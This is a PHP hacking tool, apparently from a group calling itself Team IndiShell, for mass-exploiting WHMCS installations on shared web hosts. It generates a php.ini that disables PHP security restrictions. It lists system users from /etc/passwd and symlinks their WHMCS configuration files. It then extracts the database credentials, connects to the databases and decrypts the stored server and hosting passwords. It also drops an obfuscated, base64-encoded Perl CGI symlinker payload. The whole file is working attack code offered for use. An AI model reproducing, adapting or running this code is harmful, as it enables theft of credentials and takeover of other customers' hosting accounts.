<?php


$head = '
<html>
<head>
</script>
<title>--==[[ Mannu,Mass WHM exploiter By Team IndiShell]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 2px #333;
color: #FFF;
}

.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 2px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border : solid 3px ;
border-color : #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT: Black 1px solid;
BORDER-TOP: #DF0000 1px solid;
BORDER-LEFT: #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER: buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border : dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin : -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
COLOR: White; TEXT-DECORATION: none
}
A:visited {
COLOR: White; TEXT-DECORATION: none
}
A:hover {
color: Red; TEXT-DECORATION: none
}
A:active {
color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
document.getElementById(id).style.display = \'none\';
document.cookie=id+\'=0;\';
}
function show_div(id)
{
document.getElementById(id).style.display = \'block\';
document.cookie=id+\'=1;\';
}
function change_divst(id)
{
if (document.getElementById(id).style.display == \'none\')
show_div(id);
else
hide_div(id);
}
</script>'; ?>
<html>
<head>
<?php
echo $head ;
echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >



<td  align=center valign="top" rowspan="1"><font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Mannu ]]==--</font><br>
<font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Auto mass </font><font color=white size=5 face="comic sans ms"><b> WHM exploiter By</font><font color=green size=5 face="comic sans ms"><b> Team IndiShell ]]==--</font> <div class="hedr">

<td height="10" align="left" class="td1"></td></tr><tr><td
 align="center" valign="top" rowspan="1"><font
color="red" face="comic sans ms"size="1"><b>
<font color=#ff9933>
####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font><br><font color=white>-==[[Greetz to]]==--</font><br><font color=#ff9933> Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,Atul Dwivedi,ethicalnoob Indishell,Local root indishell,Irfninja indishell,cool toad,cool shavik<br>Ebin V Thomas,Dinelson Amine,Th3 D3str0yer,SKSking,Mr. Trojan,rad paul,Godzila,mike waals,zoozoo,cyber warrior,Neo hacker ICA, Golden boy INDIA,Ketan Singh,Yash,Reborn India,Alicks,Aneesh Dogra,lovetherisk<br>Suriya Prakash,cyber gladiator,Cyber Ace,hero,Minhal Mehdi ,Raj bhai ji,cold fire hacker,Mannu, ViKi ,Budhaoo, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand,silent hacker and rest of TEAM INDISHELL<br>

<font color=white>--==[[Dedicated to]]==--</font>
<br># My Father and my Ex Teacher #<br><font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font><br><font color=#ff9933>
####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font>

</table>
</table> <div align=center><font color=#ff9933 font size=5><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="30" width="70%"><span class="footerlink">love happen only once.....Rest is life......</span></marquee><br></font></div><div align=center><font color=#ff9933 font size=4>--==[[ Code for India,Hack for India,Die for India ]]==--</font>

';

?><div align=center><font color=white font size=2>Special Thanks to Rab3oun bhai ji(coder of whm killer script)<p>
<table ><td><font size=4>--==[[ </font><a href=<?php echo "?phpi";?>><font color=white size=4><u>Generate PHP.INI file</u></font></a><font color=red>|>>+++++<<|
<a href=<?php echo "?wkiller";?>><font color=white size=4><u>Auto mass whm exploiter</u></font></a>|>>+++++<<|
<a href=<?php echo "?safe";?>><font color=white size=4><u>safemode mass symlinker</u></font></a></font><font size=4> ]]==--</font></td></table>
<?php
if(isset($_GET['phpi']))
{
$pi=fopen("php.ini",w);
$da="disable_functions=none\nsafe_mode=off";
fwrite($pi,$da);

echo "<br><br><a href=php.ini><font color=white size=2><u>link to php.ini file</u></font></a>";
}
?>

<?php
if(isset($_GET['wkiller']))
{

?>

	<br><table width=30% >
<tr>
<td align=right width=50%>
<br>
<font color=red size=3>
WHM =><br>
Cpanel => <br>

<br>
</td>
<td align=left >
<form method="post"><br>

<input type="checkbox" name="config[]" value="whm"><br>
<input type="checkbox" name="config[]" value="cpanel"><br>

</td>
</tr>
</table><br>



	Bhiyu....Just click the button given below and i will exploit all the symlinked whmcs on this server very hard :|<br>
	<input type=submit name=whmcs value="kerde khaat khadi >.<"><p>
</form>
<?php
}?>

<?php
set_time_limit(0);
error_reporting(0);
if(isset($_POST['whmcs']))
{

mkdir('ICa',0777);
$rr  = " <Files *.php>
ForceType application/x-httpd-php4
</Files>
Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .ica
AddHandler cgi-script .ica
AddHandler cgi-script .ica";
$g = fopen('ICa/.htaccess','w');
fwrite($g,$rr);
$users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
$us=$str[0];
$r="ICa/";
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
					   symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
					  symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
					   symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
					  symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
					   symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
					  symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
					   symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
					  symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
					   symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
					  symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
					   symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
					  symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
                      symlink('/home/'.$us.'/public_html/manage/configuration.php',$r.$us.'..whmcs-manage');
                      symlink('/home/'.$us.'/public_html/order/configuration.php',$r.$us.'..whmcs-order');

}


function decrypt ($string,$cc_encryption_hash)

{
$key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
$hash_key = _hash ($key);
$hash_length = strlen ($hash_key);
$string = base64_decode ($string);
$tmp_iv = substr ($string, 0, $hash_length);
$string = substr ($string, $hash_length, strlen ($string) - $hash_length);
$iv = $out = '';
$c = 0;
while ($c < $hash_length)
{
$iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
++$c;
}
$key = $iv;
$c = 0;
while ($c < strlen ($string))
{
if (($c != 0 AND $c % $hash_length == 0))
{
$key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
}
$out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
++$c;
}
return $out;
}

function _hash ($string)
{
$hash = (function_exists ('sha1')) ? sha1($string):md5($string);
$out = '';
$c = 0;
while ($c < strlen ($hash))
{
$out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
$c += 2;
}
return $out;
}
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

function data($lu)
{
	$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $lu);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
return $result['EXE'];
	
}

 $r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/ICa/";
$re=$r;
$uss=file("/etc/passwd");
foreach($uss as $uer)
{
$whmcsc=array("..whm","..whmcs","..supporwhmcs","..WHM","..whmc","..WHMcs","..whmcsupp","..whmcs-cli","..whmcs-cl","..whmcs-CL","..whmcs-Cl","..whmcs-csup","..whmcs-bill","..whmcs-manage","..whmcs-order");
 foreach($whmcsc as $whmcscon)
                          {

$su=explode(":",$uer);
$usess=$su[0];
							$finalurl=$re.$usess.$whmcscon;
							  
foreach($_POST['config'] as $check)
{
	if($check == "whm")
{

						$content=data($finalurl);

							  
							  if($content && preg_match('/cc_encryption_hash/i',$content))
                                 {

echo "<div align=center><table width=60% ><tr><td align=center><font color=red size=4 face='comic sans ms'> $usess  user's website whmcs bhaiyu xD </font></td></tr></table>";

                                  $dbu=entre2v2($content,"db_username = '","';");
								 $dbp=entre2v2($content,"db_password = '","';");
								  $dbn=entre2v2($content,"db_name = '","';");
								 $dbch=entre2v2($content,"cc_encryption_hash = '","';");
								 
								 
                                
                                        $dbu1=entre2v2($content,"db_username = \"","\";");
								 $dbp1=entre2v2($content,"db_password = \"","\";");
								  $dbn1=entre2v2($content,"db_name = \"","\";");
								  $dbch1=entre2v2($content,"cc_encryption_hash = \"","\";");

								if(!empty($dbu))
								{
								$uhost="localhost";
								$duser=trim($dbu);
								$dpass=trim($dbp);
								$ddb=trim($dbn);
								$cc_encryption_hash=trim($dbch);
								

if(@mysql_connect($uhost,$duser,$dpass) && mysql_select_db($ddb))
{
				echo "connected";		
$query = mysql_query("SELECT * FROM tblservers");
echo "<table border='1' cellpadding='2' align='center'>
<tr><td>Type</td><td>Active</td><td>IP Address</td><td>username</td><td>Password</td></tr>";
while($v = mysql_fetch_array($query)) {
echo "<tr>
<td>{$v['type']}</td><td>{$v['active']}</td><td>{$v['ipaddress']}</td><td>{$v['username']}</td><td>".decrypt($v['password'],
$cc_encryption_hash)."</td>
</tr>";
}
echo "</table>";
}
		}
		if(!empty($dbu1)){
		
		                                        $uhost1="localhost";
												$duser1=trim($dbu1);
								                $dpass1=trim($dbp1);
								                $ddb1=trim($dbn1);
								                $cc_encryption_hash1=trim($dbch1);
												if(@mysql_connect($uhost1,$duser1,$dpass1) && mysql_select_db($ddb1))
{
				echo "connected";		
$query = mysql_query("SELECT * FROM tblservers");
echo "<table border='1' cellpadding='2' align='center'>
<tr><td>Type</td><td>Active</td><td>IP Address</td><td>username</td><td>Password</td></tr>";
while($v = mysql_fetch_array($query)) {
echo "<tr>
<td>{$v['type']}</td><td>{$v['active']}</td><td>{$v['ipaddress']}</td><td>{$v['username']}</td><td>".decrypt($v['password'],
$cc_encryption_hash1)."</td>
</tr>";
}
echo "</table>";
}
		
		}
		
		
}
}
}
/////////////////////
///    cpanel  //////
/////////////////////
if($check == "cpanel")
{
	$content=data($finalurl);

							  
							  if($content && preg_match('/cc_encryption_hash/i',$content))
                                 {


 $dbu=entre2v2($content,"db_username = '","';");
								 $dbp=entre2v2($content,"db_password = '","';");
								  $dbn=entre2v2($content,"db_name = '","';");
								 $dbch=entre2v2($content,"cc_encryption_hash = '","';");
								 
								 
                                
                                        $dbu1=entre2v2($content,"db_username = \"","\";");
								 $dbp1=entre2v2($content,"db_password = \"","\";");
								  $dbn1=entre2v2($content,"db_name = \"","\";");
								  $dbch1=entre2v2($content,"cc_encryption_hash = \"","\";");
if(!empty($dbu))
								{
								$uhost="localhost";
								$duser=trim($dbu);
								$dpass=trim($dbp);
								$ddb=trim($dbn);
								$cc_encryption_hash=trim($dbch);
							if(@mysql_connect($uhost,$duser,$dpass) && mysql_select_db($ddb))

{
				$query = mysql_query("SELECT * FROM tblhosting");
               echo "<table border='1' cellpadding='5' align='center'><tr><td>domain</td><td>User</td><td>Pass</td><td>IP's</td></tr>";
              while($v = mysql_fetch_array($query)) {
echo "<tr><td>{$v['domain']}</td><td>{$v['username']}</td><td>".decrypt ($v['password'], $cc_encryption_hash)."</td><td>{$v['assignedips']}</td></tr>";
}
echo "</table>";
}
if(!empty($dbu1)){
		
		                                        $uhost1="localhost";
												$duser1=trim($dbu1);
								                $dpass1=trim($dbp1);
								                $ddb1=trim($dbn1);
								                $cc_encryption_hash1=trim($dbch1);
												if(@mysql_connect($uhost1,$duser1,$dpass1) && mysql_select_db($ddb1))
{
				$query = mysql_query("SELECT * FROM tblhosting");
               echo "<table border='1' cellpadding='5' align='center'><tr><td>domain</td><td>User</td><td>Pass</td><td>IP's</td></tr>";
              while($v = mysql_fetch_array($query)) {
echo "<tr><td>{$v['domain']}</td><td>{$v['username']}</td><td>".decrypt ($v['password'], $cc_encryption_hash)."</td><td>{$v['assignedips']}</td></tr>";
}
echo "</table>";
}
}
}
}
}
//////////////
//end
//////////
}
}
}
?>

<?php
if(isset($_GET['safe']))
{
?>
<form method=post>
<input type=submit name=passx value="cat /etc/passwd"><p></form>
<?php
if(isset($_POST['passx']))
{
?>
<textarea style="background:black;color:white" rows=20 cols=50 name=usernames ><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode("\n",$user);
echo $str[0]."\n";
}

?></textarea>
<?php
}



?>
<form method=post>

<font size=5 color=white>--==[[ <input type=submit name=perl value="click to open symlinker"> ]]==--</font><br><br></form>

<?php
}



?>
<?php
if(isset($_POST['perl']))
{
	error_reporting(0);
	$da='rVdtc9pGEP7uGf+HzZlG0Fg6sNNOzFvTYhx7xsaprTTNJB2PkA50g96iOwWwh/z27p4AEyeT4E6xQdLe7rN7u3t3j/ae8ELlfCgTnok8AvvMPEep70V86CVBLJPdnSyXiQbWSxMtEm3reSaaoMVM81DH0YfkQ8JaSy2r/eT4sue+e90HGoPXb/44P+sBszl/e9jj/Ng9hr9P3YtzaDh1cHMvUVLLNEF3vD9gwEKtsybn0+nUmR46aT7m7hWfEVaDjJe3tt6wdAIdsO7uTtt4nMVRojrfwGkcHR2V5qWy8AK6xkJ7QNq2+FjIT531NM+9ZFx4Y8HALyUdJhK7UAz4d+1cTM+GzTpPLfBDL1dCdwo9sl8sYbTUkeii7UiOYSKjSORtXgpxVOl5JIASvgTylaLoneAW7nZ3RujEHnmxjOZNcL0wjb3WUqrkLRap8TybrSRTIcehbsIwjQKU+WmU5k3YO8TPaIQCwre9SI6TJvgYushXQhV6QTpFy8jzJ1DPZuZ7YKAXuzt7fij8SVpoUvZy4VFouztTMZxIbQ/TPBC5nXuBLBRG9IsxM4bNMP0k8m+Yp5nnS41zqju/tmCIXsd5WiSBXQZ9aD4I0OYmQZQpvqynheCqGEIkI4yiWimUyGvQgZc3OFCJVY73H2d32TRYkGCSRl6HxA7jzDHaa/FnxT8knI9NuGoeRzKZVC2OWRbcKnUdi2fFMJL+DVWYT8PYV9w3xSxyj9rTycLM2jeAjuU4RsOqtbYEVEWWpbn+LmSp80hgUudvTy++i4zjj0IkwN71D+f/OMwf5xS9/t85NU5Rb3tUP5K4ZrYovo2aj4XdCvWxoGKbYHvnj4bdBvXRwW5dNJvqtj36EHdcmYy3wCXN7XFjL8GjYwvYUnF7YLObboFr9Aws7pNyBNVKf/DXnXXV//NN/9q9uei7p5fH1gLER7BeX167Vo12bdx9g+q1e3w22IfKsBiNRI43xrJ3OXD7A/fmvD945Z5aCwMNIlKCDJfKuLmW2ujl6t3NtXt1NnhlLcooXmaezBWqqCySusqf8rWTmjmk0LsfQoXUoFpqm6iqlcSLBSp/8qJC1O4ROoRAemRvlKDzGXTOn3HgmyLFf6q+9+zR7/ZJ3T76Z+O2xvGsmVRZj+1DKGbVSqNW44L2/NLbA8C17D8hnlxeXdyZoBaUKQO2USEznHlKmbIwVrtbcS8LT7hhGszBj3C4w4JbBsOxOQ07zBzLhtNk3TYd9VAOTEOpRfeLVoGRRD6xbDRiGlmXDre2yrzkC1tmjFmX1l00By60zymyabBiNqDTFRB87UO1OaF18YQ20MO8pDvmio7yGJBAhWnQYVmqNOsi1cnTZGwo0YoHSBx9SA4YUPrQCoNhYI5/zIDp9iYyEgg8FYoAchG0YCoDHTbhsI50pYW1KPnPQfn4FaswaWzBJqdaUiq4Z1RHmW7BkjqhDwY4w1Vo61k+TYYqa5l64I9MskIvo74uhrHUDbakdMo8MjCNgI+ZTEBqeGHXHk6tQVNLMQsB7NXrJ/hZT+/o6EdBN+obUS+naYidYdFUjCaWWeS+p8Q6TweH38jR3slz+msReS2bh+qcx1TnVf2IgS1oX8DufYntIXDJtzd6u0srYU6UzAziU5qJBKoX707Ozvv7wLqYTUfHGaut3iqgHAOGI2D7tyNArmYQUbBwmENyVu4huI4mXqfewt92ZU6XZ89oIWFDR6Ja+nyP0n9oFce86vz8W605a/IxKT1F2kgL9qHjSoOczPTKCfoIOg0ED9qNF3QpfTy0wYENu8Xqf/mmtMWCDg+6QZoIQHp7UC7wsrco95RnOare5wFQsdw0KKHVs8HJ5b5J2TqZ63LQWBfoLSBKlTCq5QmktIiXSardv9PhvoLvOrkYdZi1mXiLEs++3DhMe9brJnxa+6tGNg0XCD8td4kmJDgxtt4gVtuF113NbSNXjPqM0lUyfTwHu5TQfwE=';
	$decryp=gzinflate(base64_decode($da));
mkdir('ICa', 0777);
$hope = fopen("ICa/.htaccess", 'w');
$hcon= "<Files *.php>
ForceType application/x-httpd-php4
</Files>
Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .ica\nAddHandler cgi-script .ica\nAddHandler cgi-script .ica
";
fwrite ( $hope, $hcon ) ;

$pelfile = fopen("ICa/in.ica" ,"w");
fwrite ($pelfile,$decryp);
chmod("ICa/in.ica",0755);
echo "<iframe src=ICa/in.ica width=50% height=70% ></iframe><br><br> ";

}

?>
